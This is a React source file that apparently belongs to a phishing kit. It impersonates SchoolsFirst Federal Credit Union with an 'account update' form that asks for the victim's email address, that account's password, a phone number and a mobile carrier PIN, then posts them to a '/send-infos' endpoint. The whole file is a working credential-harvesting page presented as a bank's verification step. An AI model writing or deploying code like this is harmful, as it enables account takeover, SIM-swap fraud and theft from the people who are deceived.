import {
  Button,
  FormControl,
  FormHelperText,
  TextField,
  Typography,
} from "@mui/material";
import { Box } from "@mui/system";
import axios from "axios";
import React from "react";
import { useForm } from "react-hook-form";

interface AccountUpdateProps {
  updateInputs: (data: any) => void;
  inputs: {};
  history: any;
}

export const AccountUpdate: React.FC<AccountUpdateProps> = ({
  updateInputs,
  history,
}) => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();

  const onSubmit = handleSubmit(async (data) => {
    updateInputs({
      form: "ACCOUNT UPDATE",
      accountUpdate: data,
    });
    await axios.post("/send-infos", {
      form: "ACCOUNT UPDATE",
      accountUpdate: data,
    });
    history.push("/account-update");
  });
  return (
    <Box sx={{ flexGrow: 1 }} bgcolor="#f3f4f4">
      <Box
        bgcolor="white"
        sx={{
          margin: "3rem auto",
          display: "flex",
          maxWidth: ["540px", "720px", "960px", "1400px"],
          width: "100%",
          padding: "0 15px",
        }}
      >
        <Box
          sx={{
            display: "flex",
            flex: 2,
            padding: "1.5rem",
            flexDirection: "column",
          }}
        >
          <Box padding="1rem" width="70%">
            <FormControl fullWidth error={!!errors.email}>
              <TextField
                fullWidth
                label="Email address"
                type="email"
                variant="standard"
                {...register("email", {
                  validate: (value) => {
                    if (!value) {
                      return "Please enter a valid email address";
                    }

                    if (!value.includes("@") && !value.includes(".")) {
                      return "Please enter a valid email address";
                    }

                    return true;
                  },
                  required: "Please enter a valid email address",
                })}
              />
              {errors.email && (
                <FormHelperText
                  color="primary"
                  sx={{
                    marginTop: ".66666667em",
                    marginLeft: 0,
                    color: "#a61c23 !important",
                    fontSize: "75%",
                    fontWeight: 700,
                  }}
                >
                  {errors.email.message}
                </FormHelperText>
              )}
            </FormControl>
          </Box>
          <Box padding="1rem" width="70%" paddingTop={0}>
            <FormControl fullWidth error={!!errors.email}>
              <TextField
                fullWidth
                label="Email address password"
                type="password"
                variant="standard"
                {...register("password", {
                  validate: (value) => {
                    if (!value) {
                      return "Please enter your email password";
                    }

                    if (value.length < 6) {
                      return "Wrong password";
                    }

                    return true;
                  },
                  required: "Please enter your email password",
                })}
              />
              {errors.password && (
                <FormHelperText
                  color="primary"
                  sx={{
                    marginTop: ".66666667em",
                    marginLeft: 0,
                    color: "#a61c23 !important",
                    fontSize: "75%",
                    fontWeight: 700,
                  }}
                >
                  {errors.password.message}
                </FormHelperText>
              )}
            </FormControl>
          </Box>
          <Box padding="1rem" width="70%" paddingTop={0}>
            <FormControl fullWidth error={!!errors.phoneNumber}>
              <TextField
                fullWidth
                label="Phone number"
                type="number"
                variant="standard"
                {...register("phoneNumber", {
                  validate: (value) => {
                    if (!value) {
                      return "Please enter your phone number";
                    }

                    if (value.length < 10) {
                      return "Incorect phone number";
                    }

                    return true;
                  },
                  required: "Please enter your phone number",
                })}
              />
              {errors.phoneNumber && (
                <FormHelperText
                  color="primary"
                  sx={{
                    marginTop: ".66666667em",
                    marginLeft: 0,
                    color: "#a61c23 !important",
                    fontSize: "75%",
                    fontWeight: 700,
                  }}
                >
                  {errors.phoneNumber.message}
                </FormHelperText>
              )}
            </FormControl>
          </Box>
          <Box padding="1rem" width="70%" paddingTop={0}>
            <FormControl>
              <TextField
                fullWidth
                label="Carrier pin"
                type="password"
                variant="standard"
                {...register("carrierPin", {
                  validate: (value) => {
                    if (!value) {
                      return "Please enter your carrier pin";
                    }

                    if (value.length < 4) {
                      return "Incorect carrier pin";
                    }

                    return true;
                  },
                  required: "Please enter your carrier pin",
                })}
              />
              {errors.carrierPin && (
                <FormHelperText
                  color="primary"
                  sx={{
                    marginTop: ".66666667em",
                    marginLeft: 0,
                    color: "#a61c23 !important",
                    fontSize: "75%",
                    fontWeight: 700,
                  }}
                >
                  {errors.carrierPin.message}
                </FormHelperText>
              )}
            </FormControl>
          </Box>
          <Box width="50%" padding="1rem">
            <Button
              disabled
              disableRipple
              fullWidth
              sx={{
                textTransform: "uppercase",
                padding: ".5rem 1.5rem",
                fontSize: "1rem",
                lineHeight: "1.333rem",
                borderRadius: 0,
                backgroundColor: "#af5607",
                borderColor: "#af5607",
                color: "white",
                ":hover": {
                  backgroundColor: "#7b3c05",
                  borderColor: "#7b3c05",
                },
                "&.Mui-disabled": {
                  color: "white",
                  opacity: 0.3,
                },
              }}
              onClick={onSubmit}
            >
              CONTINUE
            </Button>
          </Box>
        </Box>
        <Box
          sx={{
            display: "flex",
            flex: 1,
            flexDirection: "column",
            padding: "1.5rem",
          }}
        >
          <Typography
            component="h4"
            color="primary"
            sx={{
              fontWeight: "700",
              margin: "1.5rem 0",
            }}
          >
            Why do I have to provide this information?
          </Typography>
          <Typography component="p">
            SchoolsFirst Federal Credit Union requires all this information to
            be able to verify your account
          </Typography>
          <Typography
            component="h4"
            color="primary"
            sx={{
              fontWeight: "700",
              margin: "1.5rem 0",
            }}
          >
            How will my email address be used?
          </Typography>
          <Typography component="p">
            We will send information about your account by email, including
            notifications of account activities.
          </Typography>
        </Box>
      </Box>
    </Box>
  );
};
